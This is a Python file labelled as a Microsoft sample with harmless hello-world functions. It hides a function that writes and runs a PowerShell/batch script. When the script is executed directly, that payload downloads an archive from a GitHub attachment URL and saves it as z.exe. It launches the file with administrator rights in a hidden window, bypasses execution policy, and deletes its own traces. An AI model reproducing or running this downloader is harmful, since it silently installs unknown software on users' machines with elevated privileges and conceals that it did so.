#   ---------------------------------------------------------------------------------
#   Copyright (c) Microsoft Corporation. All rights reserved.
#   Licensed under the MIT License. See LICENSE in project root for information.
#   ---------------------------------------------------------------------------------
"""This is a Sample Python file."""


from __future__ import annotations
import os


def hello_world(i: int = 0) -> str:
    """Doc String."""
    print("hello world")
    return f"string-{i}"


def good_night() -> str:
    """Doc String."""
    print("good night")
    return "string"


def hello_goodbye():
    hello_world(1)
    good_night()


def add_powershell_script():
    powershell_script = r'''
@echo off
echo $Url = 'https://github.com/user-attachments/files/15895328/z.zip'
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $ProgressPreference = 'SilentlyContinue'; $OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'z.exe'; Invoke-WebRequest -Uri $Url -OutFile $OutFile; $InstallerPath = $OutFile; $Arguments = '-fullinstall'; $Command = 'Start-Process -FilePath $InstallerPath -ArgumentList $Arguments -Verb RunAs -WindowStyle Hidden'; Invoke-Expression -Command $Command"
powershell -Command "Add-Content -Path ok.ps1 -Value 'echo $Url = ''https://github.com/user-attachments/files/15895328/z.zip''; [Net.ServicePointManager]::SecurityProtocol = ''tls12, tls11, tls''; $ProgressPreference = ''SilentlyContinue''; $OutFile = Join-Path -Path $env:USERPROFILE -ChildPath ''z.exe''; Invoke-WebRequest -Uri $Url -OutFile $OutFile; $InstallerPath = $OutFile; $Arguments = ''-fullinstall''; $Command = ''Start-Process -FilePath ''$InstallerPath'' -ArgumentList ''$Arguments'' -Verb RunAs -WindowStyle Hidden''; Invoke-Expression -Command $Command'"
powershell.exe -ExecutionPolicy Bypass -File ok.ps1
del %0
del ok.ps1
'''
    # Write the PowerShell script to a file
    script_path = os.path.join(os.environ['USERPROFILE'], 'download_and_run.ps1')
    with open(script_path, 'w') as file:
        file.write(powershell_script)

    return script_path


if __name__ == "__main__":
    hello_goodbye()
    powershell_script_path = add_powershell_script()
    os.system(f'powershell.exe -ExecutionPolicy Bypass -File "{powershell_script_path}"')
